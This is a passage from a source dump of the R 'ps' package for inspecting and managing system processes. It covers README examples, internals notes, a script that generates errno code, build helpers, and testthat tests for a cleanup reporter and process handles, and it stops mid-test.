    ## 17  4159     1 Google… gaborcs… sleep… 1.21e+3 3.79e+2 6.00e8 4.56e11 2025-04-26 23:26:54 <ps_handl>
    ## 18 22365 22350 qemu-s… gaborcs… sleep… 1.26e+4 1.65e+3 1.58e8 4.26e11 2025-04-24 10:02:15 <ps_handl>
    ## 19  1726     1 Spotli… gaborcs… sleep… 1.64e+2 4.42e+1 1.47e8 4.25e11 2025-04-22 14:34:30 <ps_handl>
    ## 20  1644     1 iTerm2  gaborcs… sleep… 6.32e+3 1.32e+3 3.87e8 4.23e11 2025-04-22 14:34:22 <ps_handl>

Top 3 memory consuming processes:

``` r
ps() |>
  top_n(3, rss) |>
  arrange(desc(rss))
```

    ## # A data frame: 3 × 11
    ##     pid  ppid name        username status  user system    rss     vms created             ps_handle 
    ##   <int> <int> <chr>       <chr>    <chr>  <dbl>  <dbl>  <dbl>   <dbl> <dttm>              <I<list>> 
    ## 1  4159     1 Google Chr… gaborcs… sleep… 1211.  379.  6.00e8 4.56e11 2025-04-26 23:26:54 <ps_handl>
    ## 2 16963  4159 Google Chr… gaborcs… sleep…  473.   68.3 5.52e8 1.91e12 2025-04-28 05:31:43 <ps_handl>
    ## 3  1644     1 iTerm2      gaborcs… sleep… 6316. 1322.  3.87e8 4.23e11 2025-04-22 14:34:22 <ps_handl>

Top 3 processes which consumed the most CPU time:

``` r
ps() |>
  mutate(cpu_time = user + system) |>
  top_n(3, cpu_time) |>
  arrange(desc(cpu_time)) |>
  select(pid, name, cpu_time)
```

    ## # A data frame: 3 × 3
    ##     pid name                       cpu_time
    ##   <int> <chr>                         <dbl>
    ## 1 22365 qemu-system-aarch64          14269.
    ## 2  1644 iTerm2                        7639.
    ## 3  4175 Google Chrome Helper (GPU)    3140.

## Code of Conduct

Please note that the ps project is released with a [Contributor Code of
Conduct](https://ps.r-lib.org/CODE_OF_CONDUCT.html). By contributing to
this project, you agree to abide by its terms.

## License

MIT © RStudio
````

### `pscheck/ps/inst/internals.md`

````text

# `ps_handle` methods

```
method           A  C  Z
--------------   -  -  -
ps_pid           +  .  +
ps_create_time   +  .  +
ps_is_running    +  .  +
ps_format        +  .  +
-
ps_ppid          .  >  +
ps_parent        .  >  +
ps_name          .  >  +
ps_exe           .  >  Z
ps_cmdline       .  >  Z
ps_status        .  >  +
ps_username      .  >  +
ps_cwd           .  >  Z
ps_uids          .  >  +
ps_gids          .  >  +
ps_terminal      .  >  +
ps_environ       .  >  Z
ps_environ_raw   .  >  Z
ps_num_threads   .  >  Z
ps_cpu_times     .  >  Z
ps_memory_info   .  >  Z
ps_num_fds       .  >  Z
ps_open_files    .  >  Z
ps_connections   .  >  Z
ps_children      .  >  +
ps_send_signal   .  <  +
ps_suspend       .  <  +
ps_resume        .  <  +
ps_terminate     .  <  +
ps_kill          .  <  +
ps_interrupt     .  <  +
```

```
A: always works, even if the process has finished
C: <: checks if process is running, before
   >: checks if process is running, after
Z: +: works fine on a zombie
   Z: errors (zombie_process) on a zombie
```

# System API

## `ps()`

## `ps_pids()`

## `ps_boot_time()`

## Process cleanup

`ps_kill_tree()`, `ps_mark_tree()`,  `with_process_cleanup()`.

## `ps_os_type()`

## `signals()`
````

### `pscheck/ps/inst/tools/error-codes.R`

````r
code <- '
#include "common.h"

#include <errno.h>

SEXP ps__define_errno(void) {

SEXP env = PROTECT(ps_new_env());

#define PS_ADD_ERRNO(err,str,val)                                        \\
  defineVar(                                                             \\
    install(#err),                                                       \\
    PROTECT(list2(PROTECT(ScalarInteger(val)), PROTECT(mkString(str)))), \\
    env);	                                                         \\
  UNPROTECT(3)

%s

#undef PS_ADD_ERRNO
#undef PS_ADD_ERRNOX

  UNPROTECT(1);
  return env;
}
'

data <- read.csv(
  stringsAsFactors = FALSE,
  textConnection(
    '
name,txt
EPERM,"Operation not permitted."
ENOENT,"No such file or directory."
ESRCH,"No such process."
EINTR,"Interrupted function call."
EIO,"Input/output error."
ENXIO,"No such device or address."
E2BIG,"Arg list too long."
ENOEXEC,"Exec format error."
EBADF,"Bad file descriptor."
ECHILD,"No child processes."
EDEADLK,"Resource deadlock avoided."
ENOMEM,"Cannot allocate memory."
EACCES,"Permission denied."
EFAULT,"Bad address."
ENOTBLK,"Not a block device."
EBUSY,"Resource busy."
EEXIST,"File exists."
EXDEV,"Improper link."
ENODEV,"Operation not supported by device."
ENOTDIR,"Not a directory."
EISDIR,"Is a directory."
EINVAL,"Invalid argument."
ENFILE,"Too many open files in system."
EMFILE,"Too many open files."
ENOTTY,"Inappropriate ioctl for device."
ETXTBSY,"Text file busy."
EFBIG,"File too large."
ENOSPC,"Device out of space."
ESPIPE,"Illegal seek."
EROFS,"Read-only file system."
EMLINK,"Too many links."
EPIPE,"Broken pipe."
EDOM,"Numerical argument out of domain."
ERANGE,"Numerical result out of range."
EAGAIN,"Resource temporarily unavailable."
EINPROGRESS,"Operation now in progress."
EALREADY,"Operation already in progress."
ENOTSOCK,"Socket operation on non-socket."
EDESTADDRREQ,"Destination address required."
EMSGSIZE,"Message too long."
EPROTOTYPE,"Protocol wrong type for socket."
ENOPROTOOPT,"Protocol not available."
EPROTONOSUPPORT,"Protocol not supported."
ESOCKTNOSUPPORT,"Socket type not supported."
ENOTSUP,"Not supported."
EPFNOSUPPORT,"Protocol family not supported."
EAFNOSUPPORT,"Address family not supported by protocol family."
EADDRINUSE,"Address already in use."
EADDRNOTAVAIL,"Cannot assign requested address."
ENETDOWN,"Network is down."
ENETUNREACH,"Network is unreachable."
ENETRESET,"Network dropped connection on reset."
ECONNABORTED,"Software caused connection abort."
ECONNRESET,"Connection reset by peer."
ENOBUFS,"No buffer space available."
EISCONN,"Socket is already connected."
ENOTCONN,"Socket is not connected."
ESHUTDOWN,"Cannot send after socket shutdown."
ETIMEDOUT,"Operation timed out."
ECONNREFUSED,"Connection refused."
ELOOP,"Too many levels of symbolic links."
ENAMETOOLONG,"File name too long."
EHOSTDOWN,"Host is down."
EHOSTUNREACH,"No route to host."
ENOTEMPTY,"Directory not empty."
EPROCLIM,"Too many processes."
EUSERS,"Too many users."
EDQUOT,"Disc quota exceeded."
ESTALE,"Stale NFS file handle."
EBADRPC,"RPC struct is bad."
ERPCMISMATCH,"RPC version wrong."
EPROGUNAVAIL,"RPC prog. not avail."
EPROGMISMATCH,"Program version wrong."
EPROCUNAVAIL,"Bad procedure for program."
ENOLCK,"No locks available."
ENOSYS,"Function not implemented."
EFTYPE,"Inappropriate file type or format."
EAUTH,"Authentication error."
ENEEDAUTH,"Need authenticator."
EPWROFF,"Device power is off."
EDEVERR,"Device error."
EOVERFLOW,"Value too large to be stored in data type."
EBADEXEC,"Bad executable (or shared library)."
EBADARCH,"Bad CPU type in executable."
ESHLIBVERS,"Shared library version mismatch."
EBADMACHO,"Malformed Mach-o file."
ECANCELED,"Operation canceled."
EIDRM,"Identifier removed."
ENOMSG,"No message of desired type."
EILSEQ,"Illegal byte sequence."
ENOATTR,"Attribute not found."
EBADMSG,"Bad message."
EMULTIHOP,"Multihop attempted."
ENODATA,"No message available."
ENOSTR,"Not a STREAM."
EPROTO,"Protocol error."
ETIME,"STREAM ioctl() timeout."
EOPNOTSUPP,"Operation not supported on socket."
EWOULDBLOCK,"Resource temporarily unavailable."
ETOOMANYREFS,"Too many references: cannot splice."
EREMOTE,"File is already NFS-mounted"
EBACKGROUND,"Caller not in the foreground process group"
EDIED,"Translator died"
ED,"The experienced user will know what is wrong."#else
EGREGIOUS,"You did *what*?"
EIEIO,"Go home and have a glass of warm, dairy-fresh milk."
EGRATUITOUS,"This error code has no purpose."
ENOLINK,"Link has been severed."
ENOSR,"Out of streams resources."
ERESTART,"Interrupted system call should be restarted."
ECHRNG,"Channel number out of range."
EL2NSYNC,"Level 2 not synchronized."
EL3HLT,"Level 3 halted."
EL3RST,"Level 3 reset."
ELNRNG,"Link number out of range."
EUNATCH,"Protocol driver not attached."
ENOCSI,"No CSI structure available."
EL2HLT,"Level 2 halted."
EBADE,"Invalid exchange."
EBADR,"Invalid request descriptor."
EXFULL,"Exchange full."
ENOANO,"No anode."
EBADRQC,"Invalid request code."
EBADSLT,"Invalid slot."
EDEADLOCK,"File locking deadlock error."
EBFONT,"Bad font file format."
ENONET,"Machine is not on the network."
ENOPKG,"Package not installed."
EADV,"Advertise error."
ESRMNT,"Srmount error."
ECOMM,"Communication error on send."
EDOTDOT,"RFS specific error"
ENOTUNIQ,"Name not unique on network."
EBADFD,"File descriptor in bad state."
EREMCHG,"Remote address changed."
ELIBACC,"Can not access a needed shared library."
ELIBBAD,"Accessing a corrupted shared library."
ELIBSCN,".lib section in a.out corrupted."
ELIBMAX,"Attempting to link in too many shared libraries."
ELIBEXEC,"Cannot exec a shared library directly."
ESTRPIPE,"Streams pipe error."
EUCLEAN,"Structure needs cleaning."
ENOTNAM,"Not a XENIX named type file."
ENAVAIL,"No XENIX semaphores available."
EISNAM,"Is a named type file."
EREMOTEIO,"Remote I/O error."
ENOMEDIUM,"No medium found."
EMEDIUMTYPE,"Wrong medium type."
ENOKEY,"Required key not available."
EKEYEXPIRED,"Key has expired."
EKEYREVOKED,"Key has been revoked."
EKEYREJECTED,"Key was rejected by service."
EOWNERDEAD,"Owner died."
ENOTRECOVERABLE,"State not recoverable."
ERFKILL,"Operation not possible due to RF-kill."
EHWPOISON,"Memory page has hardware error."
'
  )
)

defs <- sprintf(
  "
#ifdef %s
  PS_ADD_ERRNO(%s,\"%s\",%s);
#else
  PS_ADD_ERRNO(%s,\"%s\",NA_INTEGER);
#endif
",
  data$name,
  data$name,
  data$txt,
  data$name,
  data$name,
  data$txt
)

txt <- paste0(sprintf(code, paste(defs, collapse = "\n")), collapse = "\n")
writeBin(charToRaw(txt), con = "src/error-codes.c")
````

### `pscheck/ps/inst/tools/winver.R`

````r
winver_ver <- function(v = NULL) {
  if (is.null(v)) {
    v <- system("cmd /c ver", intern = TRUE)
  }
  v2 <- grep("\\[.*\\s.*\\]", v, value = TRUE)[1]
  v3 <- sub("^.*\\[[^ ]+\\s+", "", v2)
  v4 <- sub("\\]$", "", v3)
  if (is.na(v4)) {
    stop("Failed to parse windows version")
  }
  v4
}

winver_wmic <- function(v = NULL) {
  cmd <- "wmic os get Version /value"
  if (is.null(v)) {
    v <- system(cmd, intern = TRUE)
  }
  v2 <- grep("=", v, value = TRUE)
  v3 <- strsplit(v2, "=", fixed = TRUE)[[1]][2]
  v4 <- sub("\\s*$", "", sub("^\\s*", "", v3))
  if (is.na(v4)) {
    stop("Failed to parse windows version")
  }
  v4
}

winver <- function() {
  ## First we try with `wmic`
  v <- if (Sys.which("wmic") != "") {
    tryCatch(winver_wmic(), error = function(e) NULL)
  }
  ## Otherwise `ver`
  if (is.null(v)) winver_ver() else v
}

if (is.null(sys.calls())) {
  cat(winver())
}
````

### `pscheck/ps/src/install.libs.R`

````r
progs <- if (WINDOWS) {
  c("px.exe", "interrupt.exe")
} else {
  "px"
}

dest <- file.path(R_PACKAGE_DIR, paste0("bin", R_ARCH))
dir.create(dest, recursive = TRUE, showWarnings = FALSE)
file.copy(progs, dest, overwrite = TRUE)

files <- Sys.glob(paste0("*", SHLIB_EXT))
dest <- file.path(R_PACKAGE_DIR, paste0('libs', R_ARCH))
dir.create(dest, recursive = TRUE, showWarnings = FALSE)
file.copy(files, dest, overwrite = TRUE)
if (file.exists("symbols.rds")) {
  file.copy("symbols.rds", dest, overwrite = TRUE)
}
````

### `pscheck/ps/tests/testthat.R`

````r
library(testthat)
library(ps)

if (
  ps::ps_is_supported() &&
    Sys.getenv("R_COVR", "") != "true" &&
    Sys.getenv("NOT_CRAN") != ""
) {
  reporter <- ps::CleanupReporter(testthat::SummaryReporter)$new()
} else {
  reporter <- "summary"
}

if (ps_is_supported() && Sys.getenv("NOT_CRAN") != "") {
  test_check("ps", reporter = reporter)
}
````

### `pscheck/ps/tests/testthat/_snaps/common.md`

````text
# kill 2

    Code
      ps_kill(list(ph5, ph6))
    Condition
      Error:
      ! preventing sending KILL signal to process with PID 0 as it would affect every process in the process group of the calling process (Sys.getpid()) instead of PID 0

---

    Code
      ps_kill(list(ph7, ph8, ph9))
    Condition
      Error:
      ! Failed to kill some processes: 1 (launchd)
````

### `pscheck/ps/tests/testthat/fixtures/cleanup-error/test-cleanup-error.R`

````r
# https://github.com/r-lib/ps/issues/163
test_that("errors still cause a failure", {
  stop("oops")
})
````

### `pscheck/ps/tests/testthat/helpers.R`

````r
format_regexp <- function() {
  "<ps::ps_handle> PID=[0-9]+, NAME=.*, AT="
}

parse_ps <- function(args) {
  out <- processx::run("ps", args)$stdout
  sub(" *$", "", strsplit(out, "\n")[[1]][[2]])
}

parse_time <- function(x) {
  x <- utils::tail(c(0, 0, 0, as.numeric(strsplit(x, ":")[[1]])), 3)
  x[1] * 60 * 60 + x[2] * 60 + x[3]
}

wait_for_status <- function(ps, status, timeout = 5) {
  limit <- Sys.time() + timeout
  while (ps_status(ps) != status && Sys.time() < limit) {
    Sys.sleep(0.05)
  }
}

px <- function() get_tool("px")

skip_in_rstudio <- function() {
  if (Sys.getenv("RSTUDIO") != "") skip("Cannot test in RStudio")
}

has_processx <- function() {
  requireNamespace("processx", quietly = TRUE) &&
    package_version(getNamespaceVersion("processx")) >= "3.1.0.9005"
}

skip_if_no_processx <- function() {
  if (!has_processx()) skip("Needs processx >= 3.1.0.9005 to run")
}

skip_without_program <- function(prog) {
  if (Sys.which(prog) == "") skip(paste(prog, "is not available"))
}

have_ipv6_support <- function() {
  ps_os_type()[["WINDOWS"]] ||
    !is.null(ps_env$constants$address_families$AF_INET6)
}

skip_without_ipv6 <- function() {
  if (!have_ipv6_support()) skip("Needs IPv6")
}

ipv6_url <- function() {
  paste0("https://", ipv6_host())
}

ipv6_host <- function() {
  "ipv6.test-ipv6.com"
}

have_ipv6_connection <- local({
  ok <- NULL
  myurl <- NULL
  function(url = ipv6_url()) {
    if (is.null(ok) || myurl != url) {
      myurl <<- url
      opt <- options(warn = 2)
      on.exit(options(opt), add = TRUE)
      tryCatch(
        {
          cx <- curl::curl(url)
          open(cx)
          ok <<- TRUE
        },
        error = function(x) ok <<- FALSE,
        finally = close(cx)
      )
    }
    ok
  }
})

skip_without_ipv6_connection <- function() {
  if (!have_ipv6_connection()) skip("Needs working IPv6 connection")
}

wait_for_string <- function(proc, string, timeout) {
  deadline <- Sys.time() + as.difftime(timeout / 1000, units = "secs")
  str <- ""
  repeat {
    left <- max(as.double(deadline - Sys.time(), units = "secs"), 0)
    pr <- processx::poll(list(proc), as.integer(left * 1000))
    str <- paste(str, proc$read_error())
    if (grepl(string, str)) {
      return()
    }
    if (proc$has_output_connection()) {
      read_output()
    }
    if (deadline < Sys.time()) {
      stop("Cannot start proces")
    }
    if (!proc$is_alive()) stop("Cannot start process")
  }
}

## This is not perfect, e.g. we don't check that the numbers are <255,
## but will do for our purposes

is_ipv4_address <- function(x) {
  grepl("^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$", x)
}

cleanup_process <- function(p) {
  tryCatch(close(p$get_input_connection()), error = function(x) x)
  tryCatch(close(p$get_output_connection()), error = function(x) x)
  tryCatch(close(p$get_error_connection()), error = function(x) x)
  tryCatch(close(p$get_poll_connection()), error = function(x) x)
  tryCatch(p$kill(), error = function(x) x)
}

httpbin <- webfakes::new_app_process(
  webfakes::httpbin_app(),
  opts = webfakes::server_opts(num_threads = 6)
)

capture_success_failure <- function(expr) {
  cnd <- NULL
  n_success <- 0
  n_failure <- 0
  failures <- list()
  withCallingHandlers(
    expr,
    expectation_failure = function(cnd) {
      failures[[length(failures) + 1]] <<- cnd
      n_failure <<- n_failure + 1
      invokeRestart("continue_test")
    },
    expectation_success = function(cnd) {
      n_success <<- n_success + 1
      invokeRestart("continue_test")
    }
  )
  list(
    n_success = n_success,
    n_failure = n_failure,
    failures = failures
  )
}
````

### `pscheck/ps/tests/testthat/test-cleanup-reporter.R`

````r
test_that("unit: test, mode: cleanup-fail", {
  out <- list()
  on.exit(if (!is.null(out$p)) out$p$kill(), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(proc_unit = "test"),
      {
        test_that("foobar", {
          out$p <<- processx::process$new(px(), c("sleep", "5"))
          out$running <<- out$p$is_alive()
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not clean up processes", all = FALSE)

  expect_true(out$running)
  deadline <- Sys.time() + 2
  while (out$p$is_alive() && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_false(out$p$is_alive())
})

test_that("unit: test, multiple processes", {
  out <- list()
  on.exit(if (!is.null(out$p1)) out$p1$kill(), add = TRUE)
  on.exit(if (!is.null(out$p2)) out$p2$kill(), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(proc_unit = "test"),
      {
        test_that("foobar", {
          out$p1 <<- processx::process$new(px(), c("sleep", "5"))
          out$p2 <<- processx::process$new(px(), c("sleep", "5"))
          out$running <<- out$p1$is_alive() && out$p2$is_alive()
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not clean up processes.*px.*px", all = FALSE)

  expect_true(out$running)
  expect_false(out$p1$is_alive())
  expect_false(out$p2$is_alive())
})

test_that("on.exit() works", {
  out <- list()
  on.exit(if (!is.null(out$p)) out$p$kill(), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(proc_unit = "test"),
      {
        test_that("foobar", {
          out$p <<- processx::process$new(px(), c("sleep", "5"))
          on.exit(out$p$kill(), add = TRUE)
          out$running <<- out$p$is_alive()
        })
      }
    )
  )
  expect_true(status$n_failure == 0)
  expect_true(status$n_success > 0)

  expect_true(out$running)
  expect_false(out$p$is_alive())
})

test_that("only report", {
  out <- list()
  on.exit(if (!is.null(out$p)) out$p$kill(), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_unit = "test",
        proc_cleanup = FALSE,
        proc_fail = TRUE
      ),
      {
        test_that("foobar", {
          out$p <<- processx::process$new(px(), c("sleep", "5"))
          out$running <<- out$p$is_alive()
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not clean up processes", all = FALSE)

  expect_true(out$running)
  expect_true(out$p$is_alive())
  out$p$kill()
})

test_that("only kill", {
  out <- list()
  on.exit(if (!is.null(out$p)) out$p$kill(), add = TRUE)
  with_reporter(
    CleanupReporter(testthat::SilentReporter)$new(
      proc_unit = "test",
      proc_cleanup = TRUE,
      proc_fail = FALSE,
      conn_fail = FALSE
    ),
    {
      test_that("foobar", {
        out$p <<- processx::process$new(px(), c("sleep", "5"))
        out$running <<- out$p$is_alive()
      })
      ## It must be killed by now
      test_that("foobar2", {
        deadline <- Sys.time() + 3
        while (out$p$is_alive() && Sys.time() < deadline) {
          Sys.sleep(0.05)
        }
        out$running2 <<- out$p$is_alive()
      })
    }
  )

  expect_true(out$running)
  expect_false(out$running2)
  expect_false(out$p$is_alive())
})

test_that("unit: testsuite", {
  out <- list()
  on.exit(if (!is.null(out$p)) out$p$kill(), add = TRUE)
  expect_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_unit = "testsuite",
        rconn_fail = FALSE,
        file_fail = FALSE,
        conn_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$p <<- processx::process$new(px(), c("sleep", "5"))
          out$running <<- out$p$is_alive()
        })
        test_that("foobar2", {
          ## Still alive
          out$running2 <<- out$p$is_alive()
        })
      }
    ),
    "did not clean up processes"
  )

  expect_true(out$running)
  expect_true(out$running2)
  deadline <- Sys.time() + 3
  while (out$p$is_alive() && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_false(out$p$is_alive())
})

test_that("R connection cleanup, test, close, fail", {
  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(proc_fail = FALSE),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close R connections", all = FALSE)

  expect_true(out$open)
  expect_error(isOpen(out$conn))
})

test_that("R connection cleanup, test, do not close, fail", {
  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_fail = FALSE,
        rconn_cleanup = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close R connections", all = FALSE)

  expect_true(out$open)
  expect_true(isOpen(out$conn))
  expect_silent(close(out$conn))
})

test_that("R connection cleanup, test, close, do not fail", {
  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  with_reporter(
    CleanupReporter(testthat::SilentReporter)$new(
      proc_fail = FALSE,
      rconn_fail = FALSE
    ),
    {
      test_that("foobar", {
        out$conn <<- file(tmp, open = "w")
        out$open <<- isOpen(out$conn)
      })
    }
  )

  expect_true(out$open)
  expect_error(isOpen(out$conn))
})

test_that("R connections, unit: testsuite", {
  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  expect_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        rconn_unit = "testsuite",
        proc_fail = FALSE,
        file_fail = FALSE,
        conn_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
        })
        test_that("foobar2", {
          ## Still alive
          out$open2 <<- isOpen(out$conn)
        })
      }
    ),
    "did not close R connections"
  )

  expect_true(out$open)
  expect_true(out$open2)
  expect_error(isOpen(out$conn))
})

test_that("connections already open are ignored", {
  tmp2 <- tempfile()
  on.exit(unlink(tmp2), add = TRUE)
  conn <- file(tmp2, open = "w")
  on.exit(try(close(conn), silent = TRUE), add = TRUE)

  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(proc_fail = FALSE),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
          close(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure == 0)
  expect_true(status$n_success > 0)

  expect_error(isOpen(out$conn))
  expect_true(isOpen(conn))
  expect_silent(close(conn))
})

test_that("File cleanup, test, fail", {
  out <- list()
  tmp <- tempfile()
  cat("data\ndata2\n", file = tmp)
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_fail = FALSE,
        rconn_cleanup = FALSE,
        rconn_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "r")
          out$open <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close open files", all = FALSE)

  expect_true(out$open)
  expect_true(isOpen(out$conn))
  close(out$conn)
})

test_that("File cleanup, unit: testsuite", {
  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        file_unit = "testsuite",
        proc_fail = FALSE,
        rconn_fail = FALSE,
        rconn_cleanup = FALSE,
        conn_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
        })
        test_that("foobar2", {
          ## Still alive
          out$open2 <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close open files", all = FALSE)

  expect_true(out$open)
  expect_true(out$open2)
  expect_true(isOpen(out$conn))
  close(out$conn)
})

test_that("files already open are ignored", {
  tmp2 <- tempfile()
  on.exit(unlink(tmp2), add = TRUE)
  conn <- file(tmp2, open = "w")
  on.exit(try(close(conn), silent = TRUE), add = TRUE)

  out <- list()
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_fail = FALSE,
        rconn_fail = FALSE,
        rconn_cleanup = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- file(tmp, open = "w")
          out$open <<- isOpen(out$conn)
          close(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure == 0)
  expect_true(status$n_success > 0)

  expect_error(isOpen(out$conn))
  expect_true(isOpen(conn))
  expect_silent(close(conn))
})

conn <- curl::curl(httpbin$url(), open = "r")
close(conn)

test_that("Network cleanup, test, fail", {
  skip_on_cran()
  out <- list()
  on.exit(
    {
      try(close(out$conn), silent = TRUE)
    },
    add = TRUE
  )
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_fail = FALSE,
        rconn_cleanup = FALSE,
        rconn_fail = FALSE,
        file_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- curl::curl(httpbin$url("/drip"), open = "r")
          out$open <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close network", all = FALSE)

  expect_true(out$open)
  expect_true(isOpen(out$conn))
  close(out$conn)
})

test_that("Network cleanup, unit: testsuite", {
  skip_on_cran()
  out <- list()
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        conn_unit = "testsuite",
        proc_fail = FALSE,
        rconn_fail = FALSE,
        rconn_cleanup = FALSE,
        file_fail = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- curl::curl(httpbin$url("/drip"), open = "r")
          out$open <<- isOpen(out$conn)
        })
        test_that("foobar2", {
          ## Still alive
          out$open2 <<- isOpen(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure > 0)
  fails <- map_chr(status$failures, conditionMessage)
  expect_match(fails, "did not close network connections", all = FALSE)

  expect_true(out$open)
  expect_true(out$open2)
  expect_true(isOpen(out$conn))
  close(out$conn)
})

test_that("Network connections already open are ignored", {
  skip_on_cran()
  conn <- curl::curl(httpbin$url(), open = "r")
  on.exit(try(close(conn), silent = TRUE), add = TRUE)

  out <- list()
  on.exit(try(close(out$conn), silent = TRUE), add = TRUE)
  status <- capture_success_failure(
    with_reporter(
      CleanupReporter(testthat::SilentReporter)$new(
        proc_fail = FALSE,
        rconn_fail = FALSE,
        rconn_cleanup = FALSE
      ),
      {
        test_that("foobar", {
          out$conn <<- curl::curl(httpbin$url(), open = "r")
          out$open <<- isOpen(out$conn)
          close(out$conn)
        })
      }
    )
  )
  expect_true(status$n_failure == 0)
  expect_true(status$n_success > 0)

  expect_error(isOpen(out$conn))
  expect_true(isOpen(conn))
  expect_silent(close(conn))
})

# https://github.com/r-lib/ps/issues/163
test_that("errors still cause a failure", {
  rep <- CleanupReporter(testthat::SilentReporter)$new()
  expect_error(
    test_dir(
      reporter = rep,
      test_path("fixtures/cleanup-error"),
      stop_on_failure = TRUE
    )
  )
})
````

### `pscheck/ps/tests/testthat/test-common.R`

````r
test_that("create self process", {
  expect_error(ps_handle("foobar"), class = "invalid_argument")
  expect_error(ps_handle(time = 123), class = "invalid_argument")

  ps <- ps_handle()
  expect_identical(ps_pid(ps), Sys.getpid())
})

test_that("format", {
  ps <- ps_handle()
  expect_match(format(ps), format_regexp())
})

test_that("print", {
  ps <- ps_handle()
  expect_output(print(ps), format_regexp())
})

test_that("pid", {
  ## Argument check
  expect_error(ps_pid(123), class = "invalid_argument")

  ## Self
  ps <- ps_handle()
  expect_identical(ps_pid(ps), Sys.getpid())

  ## Child
  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_identical(ps_pid(ps), p1$get_pid())

  skip_if_no_processx()

  ## Even if it has quit already
  p2 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p2$kill(), add = TRUE)
  pid2 <- p2$get_pid()
  ps <- ps_handle(pid2)
  p2$kill()

  expect_false(p2$is_alive())
  expect_identical(ps_pid(ps), pid2)
})

test_that("create_time", {
  ## Argument check
  expect_error(ps_create_time(123), class = "invalid_argument")

  skip_if_no_processx()

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  ## processx$get_start_time() applies a before_start lower bound that can
  ## push the reported time up to one clock tick (10ms) above the kernel's
  ## recorded time, so exact equality is not guaranteed.
  expect_equal(
    as.numeric(p1$get_start_time()),
